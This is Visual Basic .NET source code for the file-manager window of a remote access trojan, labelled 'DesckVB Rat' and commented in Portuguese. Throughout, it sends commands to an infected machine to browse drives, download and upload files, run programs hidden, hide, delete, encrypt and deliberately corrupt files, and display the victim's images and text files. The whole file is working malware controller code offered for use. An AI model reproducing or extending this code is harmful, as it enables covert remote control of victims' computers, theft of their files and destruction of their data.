Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.IO
Imports System.Net
Imports Microsoft.VisualBasic
Imports System.Text
Imports System.Diagnostics
Imports System.Windows.Forms.PictureBox
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas
Imports System.Windows.Forms.TextBox
Imports System.Windows.Forms.ListView
Imports System.Windows.Forms.ContextMenuStrip


'Coded By Pjoao1578
'v4
Public Class Fm
#Region "file manager"
    Public sock As Integer
    Public yy As String = "||" 'senha yy = "||"
#End Region

    Private Sub Fm_Closed(sender As Object, e As EventArgs) Handles MyBase.Closed
        Try
            Me.ListView1.Items.Clear() 'limpar
            Me.TextBox1.Clear() 'limpar
            Me.TextBox2.Clear() 'limpar
            Me.PictureBox1.Image = Nothing 'limpar
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Fm_Closing(sender As Object, e As CancelEventArgs) Handles MyBase.Closing
        Try
            Me.ListView1.Items.Clear() 'limpar
            Me.TextBox1.Clear() 'limpar
            Me.TextBox2.Clear() 'limpar
            Me.PictureBox1.Image = Nothing 'limpar
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Fm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Form1.s.Send(sock, "GetDrives" & yy) 'chamar codigo + yy = "||" = senha

            Me.PictureBox1.Image = Me.PictureBox2.Image

            Me.TextBox2.Text = "DesckVB Rat [TXT]"
        Catch ex As Exception 'clean erros
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or Me.ListView1.FocusedItem.ImageIndex = 1 Or Me.ListView1.FocusedItem.ImageIndex = 2 Then
            If Me.TextBox1.Text.Length = 0 Then
                Me.TextBox1.Text += Me.ListView1.FocusedItem.Text
            Else
                Me.TextBox1.Text += Me.ListView1.FocusedItem.Text & "\"
            End If
            Me.RefreshList() 'refresh
            'menu
            Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
            Me.ListView1.ContextMenuStrip = ContextMenuStrip1
        End If
    End Sub

    Public Sub RefreshList()
        Form1.s.Send(sock, "FileManager" & Me.yy & Me.TextBox1.Text)

        Me.PictureBox1.Image = Me.PictureBox2.Image

        Me.TextBox2.Text = "DesckVB Rat [TXT]"
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        'normal  arquivo
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "normaldelete" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next

        'renomer arquivo ou pasta
        For Each x As ListViewItem In Me.ListView1.SelectedItems
            Dim a As String
            a = InputBox("Entre Com o Nome", "Renomear", "Novo Nome")
            If a <> "" Then
                Select Case Me.ListView1.FocusedItem.ImageIndex
                    Case 0 To 1
                    Case 2
                        Form1.s.Send(sock, "Rename||Folder||" & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text & yy & a)
                    Case Else
                        Form1.s.Send(sock, "Rename||File||" & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text & yy & a)
                End Select
            Else
                MessageBox.Show("O Arquivo Ou Pasta Não Foi Renomeado", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            End If
            Me.RefreshList() 'refresh
        Next
    End Sub

    Private Sub UploodToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploodToolStripMenuItem.Click
        Me.RefreshList() 'refresh
    End Sub

    Private Sub DaloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DaloadToolStripMenuItem.Click
        Me.PictureBox1.Image = Me.PictureBox2.Image
        Me.TextBox2.Text = "DesckVB Rat [TXT]"
        If Me.TextBox1.Text.Length < 4 Then
            Me.TextBox1.Text = ""
            Form1.s.Send(sock, "GetDrives" & yy)
        Else
            Me.TextBox1.Text = Me.TextBox1.Text.Substring(0, Me.TextBox1.Text.LastIndexOf("\"))
            Me.TextBox1.Text = Me.TextBox1.Text.Substring(0, Me.TextBox1.Text.LastIndexOf("\") + 1)
            Me.RefreshList() 'updeter
        End If
    End Sub

    Private Sub UploodToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles UploodToolStripMenuItem1.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        If o.FileName.Length > 0 Then
            Dim n As New IO.FileInfo(o.FileName)
            For Each x As ListViewItem In Form1.l1.SelectedItems
                Form1.s.Send(x.ToolTipText, "sendfileto" & yy & Me.TextBox1.Text & n.Name & yy & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
        Me.RefreshList() 'refresh
    End Sub

    Private Sub NovaPastaToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NovaPastaToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Dim n As String
            n = InputBox("Entre Com o Nome da Pasta", "Pasta", "Nova Pasta")
            If n = "" Then
                MessageBox.Show("A Pasta Não Serra Criada", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            Else
                Form1.s.Send(sock, "creatnewfolder" & yy & Me.TextBox1.Text & n)
            End If
        Next
        Me.RefreshList() 'refresh
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "downloadfile" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text & Me.yy & Me.ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub OpenMyDownloadToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenMyDownloadToolStripMenuItem.Click
        'abri a pasta Download do trojan
        Try
            Diagnostics.Process.Start(Application.StartupPath & "/Download")
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            Diagnostics.Process.Start(Application.StartupPath & "/Download")
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        'hide arquivo 
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "hidefolderfile" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
    End Sub

    Private Sub RestoreToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestoreToolStripMenuItem.Click
        'normal  arquivo
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "showfolderfile" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
    End Sub

    Private Sub ExecutarHideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecutarHideToolStripMenuItem.Click
        'executar + hide
        For Each x As ListViewItem In Me.ListView1.SelectedItems
            Form1.s.Send(sock, "Execute" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
            Me.RefreshList() 'refresh
        Next
    End Sub

    Private Sub ExecutarNormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecutarNormalToolStripMenuItem.Click
        'executar normal
        For Each x As ListViewItem In Me.ListView1.SelectedItems
            Form1.s.Send(sock, "Execute2" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
            Me.RefreshList() 'refresh
        Next
    End Sub

    Private Sub CryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CryptToolStripMenuItem.Click
        'cryptar TXT
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "cryptTxt" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
        MessageBox.Show("   TXT Foi Cryptado", "Cryptado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub DescryptTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DescryptTXTToolStripMenuItem.Click
        'descryptar TXT
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "descryptTXT" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
        MessageBox.Show("  O TXT Foi DesCryptado", "DesCryptado", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub ListView1_Click(sender As Object, e As EventArgs) Handles ListView1.Click
        'mostrar txt
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Me.TextBox2.Clear() 'limpar
            Form1.s.Send(sock, "txtshow" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        'mostrar imagem
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Me.PictureBox1.Image = Nothing 'limpar
            Form1.s.Send(sock, "viewimage" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub AddKeysATXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddKeysATXTToolStripMenuItem.Click
        'add keys a txt
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "addkeys" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'atualizar
        MessageBox.Show("  Os Keys Foram Adicionados Ao TXT", "Keys", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub TXTEditorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TXTEditorToolStripMenuItem.Click
        'txt editor
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "edittextfile" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
    End Sub

    Private Sub TempToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles TempToolStripMenuItem1.Click
        'local temp
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "temp")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub StartupToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartupToolStripMenuItem1.Click
        'local startup
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "startup")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub DocumentosToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DocumentosToolStripMenuItem1.Click
        'local documentos
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "documentos")
        Next
        Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.Button1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
        Me.TextBox2.ContextMenuStrip = ContextMenuStrip1
        Me.PictureBox2.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub DescktopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles DescktopToolStripMenuItem1.Click
        'local desktop
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "desktop")
        Next
        Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub AppDataRoamingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AppDataRoamingToolStripMenuItem.Click
        'local AppData\Roaming
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "appdata")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub WindowsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles WindowsToolStripMenuItem.Click
        'open windows
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "windows")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub System32ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles System32ToolStripMenuItem.Click
        'open system32
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "system32")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub ProgramFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProgramFilesToolStripMenuItem.Click
        'open ProgramFiles
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "ProgramFiles")
        Next
          Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub UserProfileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UserProfileToolStripMenuItem.Click
        'open UserProfile
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "UserProfile")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub DownloadsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadsToolStripMenuItem.Click
        'open Downloads
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "Downloads")
        Next
          Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub VideosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles VideosToolStripMenuItem.Click
        'open videos
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "videos")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub PicturesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PicturesToolStripMenuItem.Click
        'open picture
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "picture")
        Next
         Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub MusicToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MusicToolStripMenuItem.Click
        'open music
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "music")
        Next
          Me.StatusStrip1.ContextMenuStrip = ContextMenuStrip1
        Me.ListView1.ContextMenuStrip = ContextMenuStrip1
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        'copy
        Select Case Me.ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.s.Send(sock, "copy||file||" & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
            Case Else
                Form1.s.Send(sock, "copy||folder||" & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        End Select
        MessageBox.Show("Arquivo Ou Pasta Copiado", "Copiado", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub PostToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PostToolStripMenuItem.Click
        'post
        MessageBox.Show("Arquivo Ou Pasta Foi Colado", "Cole", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub CorumpeArquivosToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CorumpeArquivosToolStripMenuItem.Click
        'corumpe arquivos
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "corrupt" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'updeter list
        MessageBox.Show("O Orquivo Foi Corompido", "Corompido", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub CompressToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CompressToolStripMenuItem.Click
        'compress pra winrar
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "compress" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
        MessageBox.Show("O Orquivo Foi Comprimido Para .Rar", "Winrar", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub DescompressToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DescompressToolStripMenuItem.Click
        'descompress winrar
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "descompress" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
        MessageBox.Show("O Orquivo Foi Descomprimido", "Descomprimido", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'mensagem
    End Sub

    Private Sub PorCmdToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PorCmdToolStripMenuItem.Click
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "cmddelete" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next
        Me.RefreshList() 'refresh
    End Sub

    Private Sub NormalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NormalToolStripMenuItem.Click
        'normal  arquivo
        For Each x As ListViewItem In Form1.l1.SelectedItems
            Form1.s.Send(sock, "normaldelete" & yy & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        Next

        Select Case Me.ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.s.Send(sock, "Delete||Folder||" & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
            Case Else
                Form1.s.Send(sock, "Delete||File||" & Me.TextBox1.Text & Me.ListView1.FocusedItem.Text)
        End Select
        Me.RefreshList() 'refresh
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.PictureBox1.Image = Me.PictureBox2.Image
        Me.TextBox2.Text = "DesckVB Rat [TXT]"
        If Me.TextBox1.Text.Length < 4 Then
            Me.TextBox1.Text = ""
            Form1.s.Send(sock, "GetDrives" & yy)
        Else
            Me.TextBox1.Text = Me.TextBox1.Text.Substring(0, Me.TextBox1.Text.LastIndexOf("\"))
            Me.TextBox1.Text = Me.TextBox1.Text.Substring(0, Me.TextBox1.Text.LastIndexOf("\") + 1)
            Me.RefreshList() 'refresh
        End If
    End Sub
End Class